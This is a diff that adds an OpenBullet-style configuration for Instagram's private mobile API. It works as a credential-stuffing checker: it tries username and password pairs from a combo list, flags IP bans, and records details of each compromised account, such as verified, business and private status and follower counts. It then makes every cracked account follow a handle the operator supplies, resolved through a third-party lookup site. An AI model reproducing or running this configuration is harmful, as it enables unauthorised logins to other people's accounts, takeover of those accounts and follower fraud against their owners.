@@ -1,0 +1,164 @@
+[SETTINGS]
+{
+  "Name": "Instagram API",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-20T10:36:47.4554012-07:00",
+  "AdditionalInfo": "",
+  "Author": "FFaez1267",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "What's Your InstaGram @ (WITHOUT @)",
+      "VariableName": "ID",
+      "Id": 1877217912
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var guid = uuidv4();
+END SCRIPT -> VARS "guid"
+
+FUNCTION ToUppercase "<guid>" -> VAR "guid" 
+
+REQUEST POST "https://i.instagram.com/api/v1/accounts/login/" 
+  CONTENT "ig_sig_key_version=5&signed_body=d19e37605ed48b42e495bf082d06a906663ac2a75ebbdd9acbc5c4bd2e5e8107.{\"reg_login\":\"0\",\"login_attempt_count\":\"0\",\"device_id\":\"<guid>\",\"phone_id\":\"<guid>\",\"password\":\"<PASS>\",\"username\":\"<USER>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Instagram 134.0.0.25.116 (iPhone10,2; iOS 13_3_1; en_US; en-US; scale=2.88; 1080x1920; 204771128) AppleWebKit/420+" 
+  HEADER "Accept-Language: en-US;q=1" 
+  HEADER "X-IG-Capabilities: 36r/Fw==" 
+  HEADER "X-IG-App-ID: 1099655813402622" 
+  HEADER "X-IG-Connection-Type: WiFi" 
+  HEADER "X-IG-Connection-Speed: 174kbps" 
+  HEADER "X-IG-ABR-Connection-Speed-KBPS: 0" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "logged_in_user" 
+    KEY "<RESPONSECODE>" Contains "200" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "400" 
+    KEY "Incorrect password" 
+    KEY "invalid_credentials" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "500" 
+    KEY "error_type\": \"ip_block" 
+
+PARSE "<SOURCE>" JSON "username" CreateEmpty=FALSE -> CAP "Username" 
+
+PARSE "<SOURCE>" JSON "is_verified" CreateEmpty=FALSE -> CAP "Verified" 
+
+PARSE "<SOURCE>" JSON "is_business" CreateEmpty=FALSE -> CAP "Business Account" 
+
+PARSE "<SOURCE>" JSON "is_private" CreateEmpty=FALSE -> CAP "Private" 
+
+PARSE "<COOKIES(csrftoken)>" LR "" "" -> VAR "TOKEN" 
+
+PARSE "<COOKIES(ds_user_id)>" LR "" "" -> VAR "UserID" 
+
+REQUEST GET "https://i.instagram.com/api/v1/users/<UserID>/info/?device_id=<guid>" 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Instagram 134.0.0.25.116 (iPhone10,2; iOS 13_3_1; en_US; en-US; scale=2.88; 1080x1920; 204771128) AppleWebKit/420+" 
+  HEADER "Accept-Language: en-US;q=1" 
+  HEADER "X-IG-Capabilities: 36r/Fw==" 
+  HEADER "X-IG-App-ID: 1099655813402622" 
+  HEADER "X-IG-Connection-Type: WiFi" 
+  HEADER "X-IG-Connection-Speed: 370kbps" 
+  HEADER "Host: i.instagram.com" 
+  HEADER "X-IG-ABR-Connection-Speed-KBPS: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<SOURCE>" DoesNotContain "follower_count" 
+
+PARSE "<SOURCE>" JSON "follower_count" CreateEmpty=FALSE -> CAP "Followers" 
+
+PARSE "<SOURCE>" JSON "following_count" CreateEmpty=FALSE -> CAP "Following" 
+
+PARSE "<SOURCE>" JSON "media_count" CreateEmpty=FALSE -> CAP "Posts" 
+
+PARSE "<SOURCE>" JSON "has_anonymous_profile_picture" CreateEmpty=FALSE -> CAP "Default Profile Picture" 
+
+REQUEST POST "http://www.otzberg.net/iguserid/index.php" 
+  CONTENT "username=<ID>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.otzberg.net" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 17" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Origin: http://www.otzberg.net" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Referer: http://www.otzberg.net/iguserid/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" LR "User-ID: </b>" "<br><b>Name" -> VAR "ID" 
+
+REQUEST POST "https://i.instagram.com/api/v1/friendships/create/<ID>/" 
+  CONTENT "ig_sig_key_version=5&signed_body=e7efdfb68286ae25a7e310fd2dc20efc4416bd49adcd216b06bfc3b42e5f8b5f.{\"_csrftoken\":\"<TOKEN>\",\"_uuid\":\"<guid>\",\"_uid\":\"<UserID>\",\"user_id\":\"<ID>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Instagram 134.0.0.25.116 (iPhone10,2; iOS 13_3_1; en_US; en-US; scale=2.88; 1080x1920; 204771128) AppleWebKit/420+" 
+  HEADER "Accept-Language: en-US;q=1" 
+  HEADER "X-IG-Capabilities: 36r/Fw==" 
+  HEADER "X-IG-App-ID: 1099655813402622" 
+  HEADER "X-IG-Connection-Type: WiFi" 
+  HEADER "X-IG-Connection-Speed: 370kbps" 
+  HEADER "Host: i.instagram.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "X-IG-ABR-Connection-Speed-KBPS: 1" 
+
